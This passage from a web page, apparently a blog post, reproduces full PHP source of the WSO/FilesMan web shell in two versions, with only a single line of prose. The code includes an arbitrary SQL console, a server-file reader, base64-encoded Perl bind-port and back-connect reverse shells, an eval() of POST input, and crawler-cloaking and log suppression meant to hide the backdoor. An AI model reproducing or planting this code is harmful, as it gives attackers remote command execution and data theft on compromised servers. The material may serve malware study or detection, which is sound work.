                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;nobr&amp;gt;&amp;lt;input type=&#39;checkbox&#39; name=&#39;tbl[]&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;nbsp;&amp;lt;a href=# onclick=</span><span class="se">\&quot;</span><span class="s2">st(&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; (&quot;</span><span class="o">.</span><span class="nv">$n</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/nobr&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=&#39;checkbox&#39; onclick=&#39;is();&#39;&amp;gt; &amp;lt;input type=button value=&#39;Dump&#39; onclick=&#39;document.sf.p2.value=</span><span class="se">\&quot;</span><span class="s2">download</span><span class="se">\&quot;</span><span class="s2">;document.sf.submit();&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=&#39;border-top:2px solid #666;&#39;&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;select&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;query&#39;</span><span class="p">;</span>
                    <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
                    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">();</span>
                    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">];</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;span&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt; (</span><span class="si">$num</span><span class="s2">) &quot;</span><span class="p">;</span>
                    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;(</span><span class="nv">$num</span><span class="o">/</span><span class="mi">30</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span>
                            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;#&#39; onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, </span><span class="si">$i</span><span class="s2">)&#39;&amp;gt;&quot;</span><span class="p">,(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span><span class="s2">&quot;&amp;lt;/a&amp;gt; &quot;</span><span class="p">;</span>
                        <span class="k">else</span>
                            <span class="k">echo</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span>
                        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; LIMIT 30 OFFSET &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">);</span>
                    <span class="k">else</span>
                        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;` LIMIT &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;,30&#39;</span><span class="p">;</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">((</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;query&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$title</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;table width=100% cellspacing=0 cellpadding=2 class=main&amp;gt;&#39;</span><span class="p">;</span>
                        <span class="nv">$line</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                        <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>    <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$title</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;&#39;</span><span class="p">;</span>
                                <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$value</span><span class="p">)</span>
                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;th&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/th&amp;gt;&#39;</span><span class="p">;</span>
                                <span class="nb">reset</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                                <span class="nv">$title</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
                                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&#39;</span><span class="p">;</span>
                                <span class="nv">$line</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr class=&quot;l&#39;</span><span class="o">.</span><span class="nv">$line</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="p">;</span>
                            <span class="nv">$line</span> <span class="o">=</span> <span class="nv">$line</span><span class="o">==</span><span class="mi">1</span><span class="o">?</span><span class="mi">2</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
                            <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span>
                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;i&amp;gt;null&amp;lt;/i&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">;</span>
                                <span class="k">else</span>
                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div&amp;gt;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">error</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;textarea name=&#39;p3&#39; style=&#39;width:100%;height:100px&#39;&amp;gt;&quot;</span><span class="o">.@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;input type=submit value=&#39;Execute&#39;&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;form onsubmit=&#39;document.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">loadfile</span><span class="se">\&quot;</span><span class="s2">;document.sf.p2.value=this.f.value;document.sf.submit();return false;&#39;&amp;gt;&amp;lt;span&amp;gt;Load file&amp;lt;/span&amp;gt; &amp;lt;input  class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">loadFile</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">actionNetwork</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="nv">$back_connect_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7&quot;</span><span class="p">;</span>
    <span class="nv">$bind_port_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;h1&amp;gt;Network tools&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt; </span>
<span class="s2">   &amp;lt;form name=&#39;nfp&#39; onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;bpp&#39;,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt; </span>
<span class="s2">   &amp;lt;span&amp;gt;Bind port to /bin/sh 1&amp;lt;/span&amp;gt;&amp;lt;br/&amp;gt; </span>
<span class="s2">   Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt; </span>
<span class="s2">   &amp;lt;/form&amp;gt; </span>
<span class="s2">   &amp;lt;form name=&#39;nfp&#39; onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;bcp&#39;,this.server.value,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt; </span>
<span class="s2">   &amp;lt;span&amp;gt;Back-connect  1&amp;lt;/span&amp;gt;&amp;lt;br/&amp;gt; </span>
<span class="s2">   Server: &amp;lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;&quot;</span><span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt; </span>
<span class="s2">   &amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$w</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;file_put_contents&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span> <span class="p">{</span>
                <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">));</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bpp&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.pl&quot;</span><span class="p">,</span><span class="nv">$bind_port_p</span><span class="p">);</span>
            <span class="nv">$out</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;perl /tmp/bp.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; 1&amp;gt;/dev/null 2&amp;gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1&amp;gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bp.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcp&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">,</span><span class="nv">$back_connect_p</span><span class="p">);</span>
            <span class="nv">$out</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;perl /tmp/bc.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; 1&amp;gt;/dev/null 2&amp;gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1&amp;gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bc.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">actionRC</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&quot;uname&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">php_uname</span><span class="p">(),</span>
            <span class="s2">&quot;php_version&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">phpversion</span><span class="p">(),</span>
            <span class="s2">&quot;wso_version&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">VERSION</span><span class="p">,</span>
            <span class="s2">&quot;safemode&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$default_action</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$default_action</span><span class="p">))</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$default_action</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SecInfo&#39;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span>
    <span class="nb">call_user_func</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span>
<span class="k">exit</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<p>Below is another version of the FilesMan shell &#8211; this one is the WSO Bugabuse.net edition &#8211; Modified by Led-Zeppelin.</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&quot;615da5097ad7f4c7c38db0735bfb2004&quot;</span><span class="p">;</span>
<span class="nv">$color</span> <span class="o">=</span> <span class="s2">&quot;#df5&quot;</span><span class="p">;</span>
<span class="nv">$default_action</span> <span class="o">=</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">;</span>
<span class="nv">$default_use_ajax</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="nv">$default_charset</span> <span class="o">=</span> <span class="s1">&#39;Windows-1251&#39;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$userAgents</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Google&quot;</span><span class="p">,</span> <span class="s2">&quot;Slurp&quot;</span><span class="p">,</span> <span class="s2">&quot;MSNBot&quot;</span><span class="p">,</span> <span class="s2">&quot;ia_archiver&quot;</span><span class="p">,</span> <span class="s2">&quot;Yandex&quot;</span><span class="p">,</span> <span class="s2">&quot;Rambler&quot;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$userAgents</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;log_errors&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;WSO_VERSION&#39;</span><span class="p">,</span> <span class="s1">&#39;2.5&#39;</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">function</span> <span class="nf">WSOstripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;WSOstripslashes&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span> <span class="o">:</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">WSOstripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">wsoLogin</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;pre align=center&amp;gt;&amp;lt;form method=post&amp;gt;Password: &amp;lt;input type=password name=pass&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>

